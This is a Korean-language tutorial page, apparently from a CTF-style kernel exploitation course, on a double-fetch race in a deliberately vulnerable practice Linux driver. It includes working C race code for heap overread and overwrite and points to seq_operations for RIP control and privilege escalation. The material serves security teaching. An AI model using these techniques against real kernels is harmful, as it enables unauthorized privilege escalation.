@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="kr">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta name="og:url" content="https://pawnyable.cafe//kr/linux-kernel/LK03/double_fetch.html">
+
+    <meta name="og:title" content="Double Fetch - PAWNYABLE!">
+
+<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
+<meta name="og:description" content="もふもふpwnワールド">
+<meta name="og:type" content="website">
+<meta name="og:site_name" content="PAWNYABLE!">
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+    <meta name="subtitle" content="pawnyable">
+
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
+
+
+
+
+<title>Double Fetch | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.2"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      
+<div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/kr/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/kr/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/kr/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+      
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK03/double_fetch">JA</a>
+    
+  
+    
+      <a class="language-link" href="/en/linux-kernel/LK03/double_fetch">EN</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/kr/linux-kernel/LK03/double_fetch">KR</a>
+    
+  
+</div>
+
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    
+<div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+                Double Fetch
+                        
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK03/double_fetch">JA</a>
+    
+  
+    
+      <a class="language-link" href="/en/linux-kernel/LK03/double_fetch">EN</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/kr/linux-kernel/LK03/double_fetch">KR</a>
+    
+  
+</div>
+
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK02/null_ptr_deref.html">이전 페이지</a></div>
+            <div class="pagination-index"><a href="../index.html">목차</a></div>
+            <div class="pagination-fd"><a href="../LK04/uffd.html">다음 페이지</a></div>
+        </div>
+    
+    
+        <div class="column" title="목차">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#QEMU-%EB%B6%80%ED%8C%85-%EC%98%B5%EC%85%98"><span class="toc-text">QEMU 부팅 옵션</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EC%86%8C%EC%8A%A4-%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D"><span class="toc-text">소스 코드 분석</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-Fetch"><span class="toc-text">Double Fetch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B0%9C%ED%99%94"><span class="toc-text">취약점 발화</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#seq-operations"><span class="toc-text">seq_operations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EA%B6%8C%ED%95%9C-%EC%83%81%EC%8A%B9"><span class="toc-text">권한 상승</span></a></li></ol>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>LK03(Dexter)에서는 Double Fetch라고 불리는 취약점을 배웁니다. 먼저 <a href="distfiles/LK03.tar.gz">연습문제 LK03</a> 파일을 다운로드하세요.</p>
+<h2 id="QEMU-부팅-옵션">QEMU 부팅 옵션</h2>
+<p>LK03에서는 SMEP, KASLR, KPTI가 활성화되어 있고 SMAP은 비활성화되어 있습니다. 또한 이번에 다루는 취약점은 경쟁 상태와 관련된 버그이므로, 멀티코어로 동작한다는 점에도 주의해야 합니다.<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup><br>
+SMAP은 권한 상승을 더 쉽게 하기 위해서만 꺼 둔 것이고, 취약점 자체는 SMAP이 켜져 있어도 발화합니다.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr&quot;</span> \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -smp 2 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -net nic,model=virtio \</span><br><span class="line">    -net user</span><br></pre></td></tr></table></figure>
+<h2 id="소스-코드-분석">소스 코드 분석</h2>
+<p>먼저 LK03의 소스 코드를 읽어 봅시다. 소스 코드는 <code>src/dexter.c</code>에 있습니다.<br>
+이 프로그램은 최대 0x20바이트의 데이터를 저장할 수 있는 커널 모듈입니다. <code>ioctl</code>로 조작할 수 있고, 데이터를 읽는 기능과 쓰는 기능을 제공합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_GET 0xdec50001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_SET 0xdec50002</span></span><br><span class="line">...</span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> CMD_GET: <span class="keyword">return</span> copy_data_to_user(filp, (<span class="type">void</span>*)arg);</span><br><span class="line">    <span class="keyword">case</span> CMD_SET: <span class="keyword">return</span> copy_data_from_user(filp, (<span class="type">void</span>*)arg);</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>디바이스가 <code>open</code>되면 <code>private_data</code>에 0x20바이트 영역이 <code>kzalloc</code>으로 할당됩니다. 이 영역은 디바이스를 <code>close</code>하면 해제됩니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">  filp-&gt;private_data = kzalloc(BUFFER_SIZE, GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!filp-&gt;private_data) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">  kfree(filp-&gt;private_data);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>ioctl</code>이 호출되면, 먼저 <code>verify_request</code>에서 사용자로부터 전달된 데이터를 검사합니다. 여기서는 사용자로부터 받은 데이터 포인터가 NULL이 아니고, 크기가 0x20을 넘지 않는지 확인합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">verify_request</span><span class="params">(<span class="type">void</span> *reqp)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(&amp;req, reqp, <span class="keyword">sizeof</span>(<span class="type">request_t</span>)))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (!req.ptr || req.len &gt; BUFFER_SIZE)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (verify_request((<span class="type">void</span>*)arg))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure>
+<p>그다음 <code>CMD_GET</code>, <code>CMD_SET</code>에서는 각각 <code>private_data</code>에서 사용자에게 데이터를 복사하거나, 사용자로부터 <code>private_data</code>로 데이터를 복사할 수 있습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">copy_data_to_user</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">void</span> *reqp)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(&amp;req, reqp, <span class="keyword">sizeof</span>(<span class="type">request_t</span>)))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (copy_to_user(req.ptr, filp-&gt;private_data, req.len))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">copy_data_from_user</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">void</span> *reqp)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(&amp;req, reqp, <span class="keyword">sizeof</span>(<span class="type">request_t</span>)))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(filp-&gt;private_data, req.ptr, req.len))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>사용자로부터 데이터를 복사하기 전에 <code>verify_request</code>에서 크기를 검사하고 있으므로, 얼핏 보면 Heap Buffer Overflow는 존재하지 않는 것처럼 보입니다.</p>
+<h2 id="Double-Fetch">Double Fetch</h2>
+<p><strong>Double Fetch</strong>는 커널 공간에서 발생하는 데이터 경쟁의 한 종류에 붙은 이름입니다. 이름 그대로 커널이 같은 데이터를 두 번 fetch, 즉 읽어 오는 과정에서 발생하는 경쟁 상태를 의미합니다.<br>
+아래 그림처럼 커널 공간이 사용자 공간의 같은 데이터를 두 번 읽을 때, 그 사이에 다른 스레드가 그 데이터를 변경할 수 있습니다.</p>
+<center>
+  <img src="img/double_fetch.png" alt="Double Fetch" style="width:720px;">
+</center>
+<p>그러면 첫 번째 fetch와 두 번째 fetch에서 관측한 데이터가 달라져 정합성이 깨집니다. 이런 데이터 경쟁을 Double Fetch라고 부릅니다. <a href="../LK01/race_condition.html">LK01에서 다룬 경쟁</a>과 크게 다른 점은, 이 버그는 커널 쪽에서 mutex를 잡는 것만으로는 해결할 수 없다는 점입니다.</p>
+<p>이번 드라이버에서는 <code>verify_request</code>와 <code>copy_data_to_user</code>/<code>copy_data_from_user</code>에서 사용자 요청 데이터를 fetch합니다. 즉 <code>verify_request</code>에서는 정상적인 크기를 전달하고, 그 뒤 <code>copy_data_to_user</code> 혹은 <code>copy_data_from_user</code>가 실행되기 전 사이에 크기를 비정상적인 값으로 바꿔 버리면 Heap Buffer Overflow를 일으킬 수 있습니다.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="늑대" ></div>
+  <p class="says">
+    사용자 공간 데이터를 여러 번 다뤄야 할 때는, 처음에 커널 공간으로 복사한 뒤 그 복사본만 써야 하는 거네.
+  </p>
+</div>
+<h2 id="취약점-발화">취약점 발화</h2>
+<p>먼저 정상적인 사용법부터 확인해 봅시다. 다음과 같이 드라이버에 데이터를 저장할 수 있습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">set</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .ptr=buf, .len=len &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_SET, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .ptr=buf, .len=len &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_GET, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/dexter&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/dexter&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">  <span class="built_in">set</span>(<span class="string">&quot;Hello, World!&quot;</span>, <span class="number">13</span>);</span><br><span class="line">  get(buf, <span class="number">13</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>다음으로 Double Fetch의 동작을 확인해 봅시다. 우선 적당한 코드를 작성해서 취약점이 실제로 발화하는지 확인합니다. 여기서는 저장한 적 없는 데이터가 읽힐 때까지 경쟁을 반복하는 코드를 작성했습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">request_t</span> req;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">set</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  req.ptr = buf;</span><br><span class="line">  req.len = len;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_SET, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  req.ptr = buf;</span><br><span class="line">  req.len = len;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_GET, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> race_win = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">race</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (!race_win) &#123;</span><br><span class="line">    req.len = <span class="number">0x100</span>;</span><br><span class="line">    usleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/dexter&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/dexter&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;, zero[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">  <span class="type">pthread_t</span> th;</span><br><span class="line">  pthread_create(&amp;th, <span class="literal">NULL</span>, race, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">while</span> (!race_win) &#123;</span><br><span class="line">    get(buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(buf, zero, <span class="number">0x100</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">      race_win = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_join(th, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x: 0x%016lx\n&quot;</span>, i, *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>메인 스레드는 올바른 크기로 <code>CMD_GET</code>을 호출하고, 서브 스레드는 사용자 공간에 있는 크기 정보를 비정상적인 값으로 덮어씁니다. <code>verify_request</code>가 호출된 뒤 <code>copy_data_to_user</code>가 호출되기 전 사이에 서브 스레드가 크기 정보를 바꿔 버리면, 잘못된 크기로 데이터가 복사되어 Heap Buffer Overflow가 발생합니다.</p>
+<p><code>CMD_GET</code>의 경우 실제로 버퍼 크기를 넘어 데이터를 읽었는지만 확인하면 되지만, <code>CMD_SET</code>에서 버퍼 오버플로가 성공했는지는 어떻게 확인해야 할까요? 방법은 여러 가지가 있겠지만, 여기서는 고정 횟수만큼 범위 밖 쓰기를 시도한 뒤, 끝나고 나서 범위 밖 읽기로 성공 여부를 확인하는 방식을 택했습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">overread</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="type">char</span> *zero = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">  <span class="type">pthread_t</span> th;</span><br><span class="line">  pthread_create(&amp;th, <span class="literal">NULL</span>, race, (<span class="type">void</span>*)len);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, len);</span><br><span class="line">  <span class="built_in">memset</span>(zero, <span class="number">0</span>, len);</span><br><span class="line">  <span class="keyword">while</span> (!race_win) &#123;</span><br><span class="line">    get(buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(buf, zero, len) != <span class="number">0</span>) &#123;</span><br><span class="line">      race_win = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pthread_join(th, <span class="literal">NULL</span>);</span><br><span class="line">  race_win = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">free</span>(zero);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">overwrite</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="type">pthread_t</span> th;</span><br><span class="line">  <span class="type">char</span> *tmp = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 정해진 횟수만큼 race 시도</span></span><br><span class="line">    pthread_create(&amp;th, <span class="literal">NULL</span>, race, (<span class="type">void</span>*)len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) <span class="built_in">set</span>(buf, <span class="number">0x20</span>);</span><br><span class="line">    race_win = <span class="number">1</span>;</span><br><span class="line">    pthread_join(th, <span class="literal">NULL</span>);</span><br><span class="line">    race_win = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 힙 오버플로가 성공하지 않았으면 재시도</span></span><br><span class="line">    overread(tmp, len);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(tmp, buf, len) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>이렇게 힙 오버플로를 시도했더니, 저자의 환경에서는 우연히 뒤쪽에 망가뜨리면 안 되는 데이터가 있었던 것 같고, 아래처럼 커널 패닉이 발생했습니다.</p>
+<center>
+  <img src="img/dexter_crash.png" alt="힙 오버플로에 의한 크래시" style="width:720px;">
+</center>
+<h2 id="seq-operations"><code>seq_operations</code></h2>
+<p>이번에 파괴할 수 있는 영역은 <code>kmalloc-32</code>이므로, 같은 크기대에서 공격에 쓸 수 있는 객체를 찾아야 합니다. <code>kmalloc-32</code>에서는 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.17.1/source/include/linux/seq_file.h#L32"><code>seq_operations</code> 구조체</a>가 유용합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><code>seq_operations</code>는 sysfs, debugfs, procfs 등의 특수 파일을 사용자 공간에서 읽을 때 커널 쪽에서 호출되는 핸들러를 담고 있는 구조체입니다. 따라서 <code>/proc/self/stat</code> 같은 특수 파일을 열면 확보할 수 있습니다.<br>
+함수 포인터를 포함하고 있으므로 커널 주소 누출에 쓸 수 있고, 예를 들어 <code>read</code>를 호출하면 <code>seq_operations</code>의 <code>start</code>가 불리기 때문에 RIP 제어도 가능합니다.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_normal.png" alt="늑대" ></div>
+  <p class="says">
+    kmalloc-32에서 쓰이는 구조체는 이것 말고도 많이 있어.<br>
+    자세한 건 예제에서 직접 찾아 보자.
+  </p>
+</div>
+<h2 id="권한-상승">권한 상승</h2>
+<p>이번에는 SMAP이 비활성화되어 있으므로 사용자 공간으로 Stack Pivot이 가능합니다. 각자 ROP chain을 작성해서 권한 상승을 시도해 보세요.</p>
+<center>
+  <img src="img/dexter_privesc.png" alt="Double Fetch를 통한 권한 상승" style="width:320px;">
+</center>
+<hr>
+<div class="column" title="예제">
+  SMAP을 활성화해도 동작하도록 exploit을 수정해 보세요.
+</div>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>싱글코어에서도 경쟁을 일으키는 방법은 뒤 장에서 다시 나옵니다. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK02/null_ptr_deref.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="../LK04/uffd.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
